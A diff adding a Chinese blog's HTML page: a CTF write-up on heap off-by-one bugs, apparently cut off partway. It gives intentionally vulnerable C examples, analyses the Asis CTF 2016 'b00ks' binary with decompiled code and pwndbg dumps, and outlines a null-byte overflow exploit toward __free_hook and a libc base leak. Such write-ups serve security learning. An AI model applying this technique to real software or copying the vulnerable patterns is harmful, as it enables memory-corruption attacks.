@@ -1,0 +1,1088 @@
+<!DOCTYPE html>
+<html>
+<head hexo-theme='https://volantis.js.org/#'>
+  <meta charset="utf-8">
+  <!-- SEO相关 -->
+  
+    
+  
+  <!-- 渲染优化 -->
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <!-- 页面元数据 -->
+  
+    <title>Off-by-one - X1ngg3</title>
+  
+    <meta name="keywords" content="pwn,heap,off_by_one">
+  
+  
+    <meta name="description" content=":aru-39:">
+  
+
+  <!-- feed -->
+  
+
+  <!-- import meta -->
+  
+
+  <!-- link -->
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.13/css/all.min.css">
+  
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">
+
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-waves@0.7.6/dist/waves.min.css">
+
+  
+
+  
+  <link rel="shortcut icon" type='image/x-icon' href="https://cdn.jsdelivr.net/gh/xaoxuu/assets@master/favicon/favicon.ico">
+  
+
+  
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer@1.10/dist/APlayer.min.css">
+  
+
+  
+
+  <!-- import link -->
+  
+
+  
+  
+    
+<link rel="stylesheet" href="/css/style.css">
+
+  
+
+  <script>
+    function setLoadingBarProgress(num) {
+      document.getElementById('loading-bar').style.width=num+"%";
+    }
+  </script>
+
+  
+  
+</head>
+
+<body>
+  
+  <div id="loading-bar-wrapper">
+  <div id="loading-bar"></div>
+</div>
+<header class="l_header shadow blur">
+  <div class='container'>
+  <div class='wrapper'>
+    <div class='nav-sub'>
+      <p class="title"></p>
+      <ul class='switcher nav-list-h'>
+        <li><a class="s-comment fas fa-comments fa-fw" target="_self" href='javascript:void(0)'></a></li>
+        
+          <li><a class="s-toc fas fa-list fa-fw" target="_self" href='javascript:void(0)'></a></li>
+        
+      </ul>
+    </div>
+		<div class="nav-main">
+      
+        
+        <a class="title flat-box" target="_self" href='/'>
+          
+          
+          
+          
+            X1NGG3 <b><sup style='color:#3AA757'></sup></b>
+          
+        </a>
+      
+
+			<div class='menu navigation'>
+				<ul class='nav-list-h'>
+          
+          
+          
+            
+            
+              <li>
+                <a class="flat-box" href=/
+                  
+                  
+                  
+                    id="home"
+                  >
+                  <i class='fas fa-rss fa-fw'></i>博客
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="flat-box" href=/categories/
+                  
+                  
+                  
+                    id="categories"
+                  >
+                  <i class='fas fa-folder-open fa-fw'></i>分类
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="flat-box" href=/tags/
+                  
+                  
+                  
+                    id="tags"
+                  >
+                  <i class='fas fa-tags fa-fw'></i>标签
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="flat-box" href=/archives/
+                  
+                  
+                  
+                    id="archives"
+                  >
+                  <i class='fas fa-archive fa-fw'></i>归档
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="flat-box" href=/linkto/
+                  
+                  
+                  
+                    id="linkto"
+                  >
+                  <i class='fas fa-link fa-fw'></i>友链
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="flat-box" href=/aboutme/
+                  
+                  
+                  
+                    id="aboutme"
+                  >
+                  <i class='fas fa-info-circle fa-fw'></i>关于
+                </a>
+                
+              </li>
+            
+          
+          
+				</ul>
+			</div>
+
+      <div class="m_search">
+        <form name="searchform" class="form u-search-form">
+          <i class="icon fas fa-search fa-fw"></i>
+          <input type="text" class="input u-search-input" placeholder="Search..." />
+        </form>
+      </div>
+
+			<ul class='switcher nav-list-h'>
+				
+					<li><a class="s-search fas fa-search fa-fw" target="_self" href='javascript:void(0)'></a></li>
+				
+				<li>
+          <a class="s-menu fas fa-bars fa-fw" target="_self" href='javascript:void(0)'></a>
+          <ul class="menu-phone list-v navigation white-box">
+            
+              
+            
+              <li>
+                <a class="flat-box" href=/
+                  
+                  
+                  
+                    id="home"
+                  >
+                  <i class='fas fa-rss fa-fw'></i>博客
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="flat-box" href=/categories/
+                  
+                  
+                  
+                    id="categories"
+                  >
+                  <i class='fas fa-folder-open fa-fw'></i>分类
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="flat-box" href=/tags/
+                  
+                  
+                  
+                    id="tags"
+                  >
+                  <i class='fas fa-tags fa-fw'></i>标签
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="flat-box" href=/archives/
+                  
+                  
+                  
+                    id="archives"
+                  >
+                  <i class='fas fa-archive fa-fw'></i>归档
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="flat-box" href=/linkto/
+                  
+                  
+                  
+                    id="linkto"
+                  >
+                  <i class='fas fa-link fa-fw'></i>友链
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="flat-box" href=/aboutme/
+                  
+                  
+                  
+                    id="aboutme"
+                  >
+                  <i class='fas fa-info-circle fa-fw'></i>关于
+                </a>
+                
+              </li>
+            
+          
+            
+          </ul>
+        </li>
+			</ul>
+		</div>
+	</div>
+  </div>
+</header>
+
+<script>setLoadingBarProgress(40);</script>
+
+
+
+  <div class="l_body nocover">
+    <div class='body-wrapper'>
+      
+
+<div class='l_main'>
+  
+
+  
+    <article id="post" class="post white-box reveal shadow article-type-post" itemscope itemprop="blogPost">
+      
+
+
+  <section class='meta'>
+    
+      
+      
+      <div class="meta" id="header-meta">
+        
+          
+  <h1 class="title">
+    <a href="/2020/12/02/pwn_off-by-one/">
+      Off-by-one
+    </a>
+  </h1>
+
+
+        
+        <div class='new-meta-box'>
+          
+            
+          
+            
+              
+<div class='new-meta-item author'>
+  <a href="https://x1ngg3.github.io" rel="nofollow">
+    <img src="https://i.loli.net/2020/11/16/JlV4WshTkxutAEm.jpg">
+    <p>x1ngg3</p>
+  </a>
+</div>
+
+            
+          
+            
+              
+  
+  <div class='new-meta-item category'>
+    <a href='/categories/PWN/' rel="nofollow">
+      <i class="fas fa-folder-open fa-fw" aria-hidden="true"></i>
+      <p>PWN</p>
+    </a>
+  </div>
+
+
+            
+          
+            
+              <div class="new-meta-item date">
+  <a class='notlink'>
+    <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
+    <p>发布于：Dec 2, 2020</p>
+  </a>
+</div>
+
+            
+          
+            
+              
+
+            
+          
+        </div>
+        
+          <hr>
+        
+      </div>
+    
+  </section>
+
+
+      <section class="article typo">
+        <div class="article-entry" itemprop="articleBody">
+          
+          <p>:aru-39:</p>
+<a id="more"></a>
+<h3 id="what-is-off-by-one">what is off-by-one</h3>
+<p>严格来说，off-by-one漏洞是一种特殊的溢出漏洞，指程序向缓冲区中写入时，写入的字节数超过了缓冲区本身的大小，并且只越界了一个字节。这种漏洞的产生往往与边界验证不严或字符串操作有关，当然也有可能写入的size正好就只多了一个字节：</p>
+<ul>
+<li>使用循环语句向缓冲区中写入数据时，循环的次数设置错误导致多写入一个字节</li>
+<li>字符串操作不合适，比如忽略了字符串末尾的<code>\x00</code></li>
+</ul>
+<p>一般而言，单字节溢出很难利用。但因为Linux中的堆管理机制ptmalloc验证的松散型，基于Linux堆的off-by-one漏洞利用起来并不复杂，而且威力强大。需要说明的是，<code>off-by-one</code>是可以基于各种缓冲区的，如栈、bss段等。但堆上的<code>off-by-one</code>在CTF中比较常见。</p>
+<h3 id="两种常见的off-by-one例子">两种常见的off-by-one例子</h3>
+<h4 id="栅栏错误">栅栏错误</h4>
+<p>多写入一个字节</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">my_gets</span><span class="params">(<span class="keyword">char</span> *ptr,<span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;=size;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        ptr[i]=getchar();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *chunk1,*chunk2;</span><br><span class="line">    chunk1=<span class="built_in">malloc</span>(<span class="number">16</span>);</span><br><span class="line">    chunk2=<span class="built_in">malloc</span>(<span class="number">16</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Get Input:&quot;</span>);</span><br><span class="line">    my_gets(chunk1,<span class="number">16</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="null-byte-off-by-one">null byte off-by-one</h4>
+<p>第二十五个字节被设置为 <code>“\x00”</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">40</span>]=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">void</span> *chunk1;</span><br><span class="line">    chunk1=<span class="built_in">malloc</span>(<span class="number">24</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Get Input&quot;</span>);</span><br><span class="line">    gets(buffer);</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strlen</span>(buffer)==<span class="number">24</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">strcpy</span>(chunk1,buffer);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="Asis-CTF-2016-b00ks">Asis CTF 2016 b00ks</h3>
+<h4 id="程序分析">程序分析</h4>
+<p>首先题目提供了如下功能</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">1.</span> Create a book</span><br><span class="line"><span class="bullet">2.</span> Delete a book</span><br><span class="line"><span class="bullet">3.</span> Edit a book</span><br><span class="line"><span class="bullet">4.</span> Print book detail</span><br><span class="line"><span class="bullet">5.</span> Change current author name</span><br><span class="line"><span class="bullet">6.</span> Exit</span><br></pre></td></tr></table></figure>
+<p>其中对于 <code>create</code> 创建了三个堆块，一个 <code>name</code> 块，大小为自定义；一个 <code>description</code> 块，大小为自定义；一个 <code>book_ptr</code> 块，大小为固定，用来保存当前book的信息，如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">book_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> book_id;    <span class="comment">// offset:0</span></span><br><span class="line">    <span class="keyword">char</span>* book_name;    <span class="comment">// offset:8    malloc(size)</span></span><br><span class="line">    <span class="keyword">char</span>* book_description;    <span class="comment">// offset:16     malloc(size)</span></span><br><span class="line">    <span class="keyword">int</span> book_description_size;  <span class="comment">// offset:24</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="漏洞分析">漏洞分析</h4>
+<p>不难发现，在程序最开始读入 <code>author_name</code> 和修改 <code>author_name</code> 的时候，都存在 <code>null byte off-by-one</code> 漏洞。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> __int64 <span class="title">sub_B6D</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter author name: &quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !my_read(author_name, <span class="number">32</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;fail to read author_name&quot;</span>, <span class="number">32L</span>L);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1L</span>L;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">signed</span> __int64 __fastcall <span class="title">my_read</span><span class="params">(_BYTE *a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  _BYTE *buf; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a2 &lt;= <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  buf = a1;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( read(<span class="number">0</span>, buf, <span class="number">1u</span>LL) != <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1L</span>L;</span><br><span class="line">    <span class="keyword">if</span> ( *buf == <span class="number">10</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    ++buf;</span><br><span class="line">    <span class="keyword">if</span> ( i == a2 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  *buf = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>那知道这一点又有什么用呢，可以看到，在保存 <code>book_struct</code> 结构体的时候，在数据段同时保存了这个结构体堆的地址：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> book_ptr = <span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line"><span class="keyword">if</span> ( book_ptr )</span><br><span class="line">&#123;</span><br><span class="line">	*(book_ptr + <span class="number">6</span>) = v1;         <span class="comment">// size</span></span><br><span class="line">    *(book_struct + v2) = book_ptr;<span class="comment">// 在数据段存下这个堆的地址</span></span><br><span class="line">    *(book_ptr + <span class="number">2</span>) = p;          <span class="comment">// description</span></span><br><span class="line">    *(book_ptr + <span class="number">1</span>) = ptr;        <span class="comment">// name</span></span><br><span class="line">    *book_ptr = ++id;             <span class="comment">// id</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>回想起我们同时在数据段存了 <code>author_name</code>，二者有这样的关系：</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.data</span><span class="selector-pseudo">:0000000000202008</span> <span class="selector-tag">off_202008</span>      <span class="selector-tag">dq</span> <span class="selector-tag">offset</span> <span class="selector-tag">off_202008</span>    ; <span class="selector-tag">DATA</span> <span class="selector-tag">XREF</span>: <span class="selector-tag">sub_980</span>+17↑<span class="selector-tag">r</span></span><br><span class="line"><span class="selector-class">.data</span><span class="selector-pseudo">:0000000000202008</span>                                         ; <span class="selector-class">.data</span><span class="selector-pseudo">:off_202008</span>↓<span class="selector-tag">o</span></span><br><span class="line"><span class="selector-class">.data</span><span class="selector-pseudo">:0000000000202010</span> <span class="selector-tag">book_struct</span>     <span class="selector-tag">dq</span> <span class="selector-tag">offset</span> <span class="selector-tag">unk_202060</span>    ; <span class="selector-tag">DATA</span> <span class="selector-tag">XREF</span>: <span class="selector-tag">sub_B24</span><span class="selector-pseudo">:loc_B38</span>↑<span class="selector-tag">o</span></span><br><span class="line"><span class="selector-class">.data</span><span class="selector-pseudo">:0000000000202010</span>                                         ; <span class="selector-tag">sub_BBD</span><span class="selector-pseudo">:loc_C1B</span>↑<span class="selector-tag">o</span> ...</span><br><span class="line"><span class="selector-class">.data</span><span class="selector-pseudo">:0000000000202018</span> <span class="selector-tag">author_name</span>     <span class="selector-tag">dq</span> <span class="selector-tag">offset</span> <span class="selector-tag">unk_202040</span>    ; <span class="selector-tag">DATA</span> <span class="selector-tag">XREF</span>: <span class="selector-tag">sub_B6D</span>+15↑<span class="selector-tag">o</span></span><br><span class="line"><span class="selector-class">.data</span><span class="selector-pseudo">:0000000000202018</span>                                         ; <span class="selector-tag">sub_D1F</span>+<span class="selector-tag">CA</span>↑<span class="selector-tag">o</span></span><br><span class="line"><span class="selector-class">.data</span><span class="selector-pseudo">:0000000000202018</span> _<span class="selector-tag">data</span>           <span class="selector-tag">ends</span></span><br><span class="line"><span class="selector-class">.data</span><span class="selector-pseudo">:0000000000202018</span></span><br></pre></td></tr></table></figure>
+<p>我们不妨在内存中直接观察看看，这里是在create一个book之后的结构，可以看到<code>boo1_struct_addr</code>就紧跟在<code>author_name</code>之后</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">pwndbg</span>&gt; x/<span class="number">30</span>gx <span class="number">0</span>x<span class="number">555555756010</span></span><br><span class="line"><span class="attribute">0x555555756010</span>:	<span class="number">0</span>x<span class="number">0000555555756060</span>	<span class="number">0</span>x<span class="number">0000555555756040</span></span><br><span class="line"><span class="attribute">0x555555756020</span>:	<span class="number">0</span>x<span class="number">0000000100000000</span>	<span class="number">0</span>x<span class="number">0000000000000000</span></span><br><span class="line"><span class="attribute">0x555555756030</span>:	<span class="number">0</span>x<span class="number">0000000000000000</span>	<span class="number">0</span>x<span class="number">0000000000000000</span></span><br><span class="line"><span class="attribute">0x555555756040</span>:	<span class="number">0</span>x<span class="number">6161616161616161</span>	<span class="number">0</span>x<span class="number">6161616161616161</span></span><br><span class="line"><span class="attribute">0x555555756050</span>:	<span class="number">0</span>x<span class="number">6161616161616161</span>	<span class="number">0</span>x<span class="number">6161616161616161</span></span><br><span class="line"><span class="attribute">0x555555756060</span>:	<span class="number">0</span>x<span class="number">0000555555758240</span>	<span class="number">0</span>x<span class="number">0000000000000000</span>   指向了book<span class="number">1</span>_struct_addr</span><br><span class="line"><span class="attribute">0x555555756070</span>:	<span class="number">0</span>x<span class="number">0000000000000000</span>	<span class="number">0</span>x<span class="number">0000000000000000</span></span><br><span class="line"><span class="attribute">0x555555756080</span>:	<span class="number">0</span>x<span class="number">0000000000000000</span>	<span class="number">0</span>x<span class="number">0000000000000000</span></span><br><span class="line"><span class="attribute">0x555555756090</span>:	<span class="number">0</span>x<span class="number">0000000000000000</span>	<span class="number">0</span>x<span class="number">0000000000000000</span></span><br><span class="line"><span class="attribute">0x5555557560a0</span>:	<span class="number">0</span>x<span class="number">0000000000000000</span>	<span class="number">0</span>x<span class="number">0000000000000000</span></span><br><span class="line"><span class="attribute">0x5555557560b0</span>:	<span class="number">0</span>x<span class="number">0000000000000000</span>	<span class="number">0</span>x<span class="number">0000000000000000</span></span><br><span class="line"><span class="attribute">0x5555557560c0</span>:	<span class="number">0</span>x<span class="number">0000000000000000</span>	<span class="number">0</span>x<span class="number">0000000000000000</span></span><br><span class="line"><span class="attribute">0x5555557560d0</span>:	<span class="number">0</span>x<span class="number">0000000000000000</span>	<span class="number">0</span>x<span class="number">0000000000000000</span></span><br><span class="line"><span class="attribute">0x5555557560e0</span>:	<span class="number">0</span>x<span class="number">0000000000000000</span>	<span class="number">0</span>x<span class="number">0000000000000000</span></span><br><span class="line"><span class="attribute">0x5555557560f0</span>:	<span class="number">0</span>x<span class="number">0000000000000000</span>	<span class="number">0</span>x<span class="number">0000000000000000</span></span><br><span class="line"><span class="attribute">pwndbg</span>&gt; heap</span><br><span class="line"><span class="attribute">Allocated</span> chunk | IS_MMAPED</span><br><span class="line"><span class="attribute">Addr</span>: <span class="number">0</span>x<span class="number">555555757000</span></span><br><span class="line"><span class="attribute">Size</span>: <span class="number">0</span>xa<span class="number">363532</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">pwndbg</span>&gt; parseheap</span><br><span class="line"><span class="attribute">addr</span>                prev                size                 status              fd                bk                </span><br><span class="line"><span class="attribute">0x555555757000</span>      <span class="number">0</span>x<span class="number">0</span>                 <span class="number">0</span>x<span class="number">1010</span>               Used                None              None</span><br><span class="line"><span class="attribute">0x555555758010</span>      <span class="number">0</span>x<span class="number">0</span>                 <span class="number">0</span>x<span class="number">110</span>                Used                None              None	 book<span class="number">1</span>_name</span><br><span class="line"><span class="attribute">0x555555758120</span>      <span class="number">0</span>x<span class="number">0</span>                 <span class="number">0</span>x<span class="number">110</span>                Used                None              None  book<span class="number">1</span>_description</span><br><span class="line"><span class="attribute">0x555555758230</span>      <span class="number">0</span>x<span class="number">0</span>                 <span class="number">0</span>x<span class="number">30</span>                 Used                None              None  book<span class="number">1</span>_struct</span><br></pre></td></tr></table></figure>
+<p>可以看到<code>author_name</code>和<code>book1_struct_addr</code>之间相差的正好是32个字节，在写入32个字节长度<code>author_name</code>时，会向<code>book1_struct_addr</code>写入一个字节的&quot;\x00&quot;，在<code>book1</code>被创建后&quot;\x00&quot;就会被覆盖掉，所以可以通过打印<code>author_name</code>来实现泄露<code>book1_struct_addr</code>的地址。</p>
+<h3 id="漏洞利用">漏洞利用</h3>
+<p>创建两个<code>book</code>，通过<code>null byte off-by-one</code>，可以使<code>book1_struct_addr</code>指向<code>book1_description</code>，这里需要注意的是book1的size不要设置的太小，不然当<code>boo1_struct</code>低位字节被&quot;\x00&quot;覆盖之后不能正确落到<code>book1_description</code>，然后通过编辑<code>book1_description</code>来伪造<code>boo1_struct</code>，这个伪造的<code>book1_struct</code>中，使<code>book1_description</code>指向<code>book2_name</code>，从而依次覆盖掉<code>book2_name</code>和<code>book2_description</code>。现在我们通过edit book2就可以实现任意地址写了，但开启了got表不可写，但是但是可以改写<code>__free_hook</code>。</p>
+<p>那可以实现任意改写之后，如何拿到shell权限呢，或者说<strong>如何拿到libc基址呢。</strong></p>
+<p><strong>这里的巧妙之处在于创建book2的时候，如果把size设的很高，现有的heap不足以分配，堆就会以mmap的形式进行扩展。而扩展的mmap与libc基址之间的偏移使固定的，所以我们可以根据这个固定偏移来计算出基址</strong>。</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">LEGEND</span>: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">    <span class="attribute">0x555555554000</span>     <span class="number">0</span>x<span class="number">555555556000</span> r-xp     <span class="number">2000</span> <span class="number">0</span>      /home/x<span class="number">1</span>ngg<span class="number">3</span>/Desktop/heap/books</span><br><span class="line">    <span class="attribute">0x555555755000</span>     <span class="number">0</span>x<span class="number">555555756000</span> r--p     <span class="number">1000</span> <span class="number">1000</span>   /home/x<span class="number">1</span>ngg<span class="number">3</span>/Desktop/heap/books</span><br><span class="line">    <span class="attribute">0x555555756000</span>     <span class="number">0</span>x<span class="number">555555757000</span> rw-p     <span class="number">1000</span> <span class="number">2000</span>   /home/x<span class="number">1</span>ngg<span class="number">3</span>/Desktop/heap/books</span><br><span class="line">    <span class="attribute">0x555555757000</span>     <span class="number">0</span>x<span class="number">555555779000</span> rw-p    <span class="number">22000</span> <span class="number">0</span>     <span class="meta"> [heap]</span></span><br><span class="line">    <span class="attribute">0x7ffff7a0d000</span>     <span class="number">0</span>x<span class="number">7</span>ffff<span class="number">7</span>bcd<span class="number">000</span> r-xp   <span class="number">1</span>c<span class="number">0000</span> <span class="number">0</span>      /lib/x<span class="number">86</span>_<span class="number">64</span>-linux-gnu/libc-<span class="number">2</span>.<span class="number">23</span>.so   libc基址<span class="number">0</span>x<span class="number">7</span>ffff<span class="number">7</span>a<span class="number">0</span>d<span class="number">000</span></span><br><span class="line">    <span class="attribute">0x7ffff7bcd000</span>     <span class="number">0</span>x<span class="number">7</span>ffff<span class="number">7</span>dcd<span class="number">000</span> ---p   <span class="number">200000</span> <span class="number">1</span>c<span class="number">0000</span> /lib/x<span class="number">86</span>_<span class="number">64</span>-linux-gnu/libc-<span class="number">2</span>.<span class="number">23</span>.so</span><br><span class="line">    <span class="attribute">0x7ffff7dcd000</span>     <span class="number">0</span>x<span class="number">7</span>ffff<span class="number">7</span>dd<span class="number">1000</span> r--p     <span class="number">4000</span> <span class="number">1</span>c<span class="number">0000</span> /lib/x<span class="number">86</span>_<span class="number">64</span>-linux-gnu/libc-<span class="number">2</span>.<span class="number">23</span>.so</span><br><span class="line">    <span class="attribute">0x7ffff7dd1000</span>     <span class="number">0</span>x<span class="number">7</span>ffff<span class="number">7</span>dd<span class="number">3000</span> rw-p     <span class="number">2000</span> <span class="number">1</span>c<span class="number">4000</span> /lib/x<span class="number">86</span>_<span class="number">64</span>-linux-gnu/libc-<span class="number">2</span>.<span class="number">23</span>.so</span><br><span class="line">    <span class="attribute">0x7ffff7dd3000</span>     <span class="number">0</span>x<span class="number">7</span>ffff<span class="number">7</span>dd<span class="number">7000</span> rw-p     <span class="number">4000</span> <span class="number">0</span>      </span><br><span class="line">    <span class="attribute">0x7ffff7dd7000</span>     <span class="number">0</span>x<span class="number">7</span>ffff<span class="number">7</span>dfd<span class="number">000</span> r-xp    <span class="number">26000</span> <span class="number">0</span>      /lib/x<span class="number">86</span>_<span class="number">64</span>-linux-gnu/ld-<span class="number">2</span>.<span class="number">23</span>.so</span><br><span class="line">    <span class="attribute">0x7ffff7fd9000</span>     <span class="number">0</span>x<span class="number">7</span>ffff<span class="number">7</span>fdc<span class="number">000</span> rw-p     <span class="number">3000</span> <span class="number">0</span>      </span><br><span class="line">    <span class="attribute">0x7ffff7ff7000</span>     <span class="number">0</span>x<span class="number">7</span>ffff<span class="number">7</span>ffa<span class="number">000</span> r--p     <span class="number">3000</span> <span class="number">0</span>     <span class="meta"> [vvar]</span></span><br><span class="line">    <span class="attribute">0x7ffff7ffa000</span>     <span class="number">0</span>x<span class="number">7</span>ffff<span class="number">7</span>ffc<span class="number">000</span> r-xp     <span class="number">2000</span> <span class="number">0</span>     <span class="meta"> [vdso]</span></span><br><span class="line">    <span class="attribute">0x7ffff7ffc000</span>     <span class="number">0</span>x<span class="number">7</span>ffff<span 